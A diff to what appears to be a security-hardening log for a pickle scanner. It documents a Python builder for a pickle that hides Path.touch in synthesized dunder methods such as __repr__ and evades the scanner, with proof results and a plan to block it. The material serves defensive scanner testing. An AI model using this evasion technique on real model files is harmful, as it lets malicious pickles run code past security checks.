@@ -5502,3 +5502,150 @@ Blocking plan:
 
 Performance note: two literals in the existing magic-method matcher, no class
 creation or descriptor flow modeling.
+
+## Turn 105 - Presentation and size protocol method family gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using common representation,
+size, truthiness, formatting, and length-hint protocol dispatch.
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `builtins.str` as the base class for presentation/size hooks so the
+  instance is a valid filesystem path when passed to `pathlib.Path.touch`.
+- Install `pathlib.Path.touch` as a protocol method such as `__repr__`.
+- Instantiate the class with a marker path.
+- Call the matching clean helper, for example `builtins.repr(instance)`,
+  during unpickling.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_protocol_repr_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        text("DerivedValue"),
+        sg("builtins", "str"),
+        b"\x85",
+        b"}",
+        text("__repr__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg("builtins", "repr"),
+        b"h\x01\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 for the `__repr__` representative:
+
+- Control scanner result: `len=128`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=147`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=147`, `bytes_total=147`,
+  `opcode_count=33`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `builtins.str`,
+  `pathlib.Path.touch`, and `builtins.repr`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final `repr` call returns a
+  `DerivedValue` instance and does not create the marker
+- Unpickle result: the full payload raises
+  `TypeError: __repr__ returned non-string (type NoneType)` after creating
+  `/tmp/ma_protocol_repr_marker` with mode `0o644`
+
+Sibling slot proof:
+
+| Helper | Method | Scanner verdict | Runtime result |
+| --- | --- | --- | --- |
+| `builtins.repr` | `__repr__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
+| `builtins.str` | `__str__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
+| `builtins.bytes` | `__bytes__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
+| `builtins.hash` | `__hash__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
+| `builtins.len` | `__len__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
+| `builtins.bool` | `__bool__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
+| `operator.length_hint` | `__length_hint__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
+| `builtins.format` | `__format__` | clean, 0 findings, 0 notices | dangling symlink created by `Path.symlink_to`, then return-type `TypeError` |
+
+RCE mechanism:
+
+- `type("DerivedValue", (str,), {"__repr__": Path.touch})` creates a
+  path-like string subclass with attacker-controlled representation behavior.
+- `DerivedValue(marker)` creates an instance whose string value is the marker
+  path.
+- `builtins.repr(instance)` dispatches to `instance.__repr__()`.
+- Because `__repr__` points at `Path.touch`, CPython calls
+  `Path.touch(instance)`, creating the marker path before validating that the
+  special method returned a string.
+- The same side-effect-before-return-check pattern applies to `__str__`,
+  `__bytes__`, `__hash__`, `__len__`, `__bool__`, and `__length_hint__`.
+- For `__format__`, `Path.symlink_to(instance, format_spec)` creates a
+  symlink at the attacker-controlled path before CPython rejects the `None`
+  return value.
+
+Why the scanner missed it:
+
+- Presentation and size protocol dunder slots `__repr__`, `__str__`,
+  `__bytes__`, `__hash__`, `__len__`, `__bool__`, `__format__`, and
+  `__length_hint__` are absent from the suspicious magic-method string list.
+- The corresponding helpers `builtins.repr`, `builtins.str`,
+  `builtins.bytes`, `builtins.hash`, `builtins.len`, `builtins.bool`,
+  `builtins.format`, and `operator.length_hint` are absent from
+  `DANGEROUS_GLOBALS`.
+- `builtins.type`, `builtins.str`, `pathlib.Path.touch`,
+  `pathlib.Path.symlink_to`, and `operator.length_hint` are clean; neither
+  `pathlib` nor public `operator` is wildcard-dangerous.
+- The active call target visible to the scanner is a common builtin protocol
+  helper, while the attacker-selected callable is hidden in a dynamically
+  synthesized special method.
+
+Performance note: the focused next block should add the eight confirmed
+protocol names to the existing suspicious magic-method matcher. That is eight
+literal comparisons, keeps broad builtins like `len`, `repr`, and `format`
+allowed, and avoids any data-flow modeling of CPython's protocol dispatch.
+
+## Turn 106 - Block presentation and size protocol seeds
+
+Blocking plan:
+
+- Add `__repr__`, `__str__`, `__bytes__`, `__hash__`, `__len__`,
+  `__bool__`, `__format__`, and `__length_hint__` to the existing suspicious
+  magic-method string list. These hooks can execute during ordinary builtin
+  representation, conversion, sizing, truthiness, formatting, and
+  length-hint dispatch.
+- Leave `builtins.repr`, `builtins.str`, `builtins.bytes`, `builtins.hash`,
+  `builtins.len`, `builtins.bool`, `builtins.format`, and
+  `operator.length_hint` allowed. The low-cost static signal is the
+  attacker-controlled protocol slot name, which avoids false positives on
+  common helper calls.
+- Add a CPython oracle regression for all eight Turn 105 slots. The regression
+  verifies construction-only controls are suspicious and side-effect free,
+  then verifies each active helper dispatch is suspicious and still creates
+  the marker or symlink during `pickle.loads()` before CPython raises the
+  expected return-type `TypeError`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: eight literals in the existing magic-method matcher, no
+presentation-helper blocklist expansion and no protocol-dispatch flow modeling.
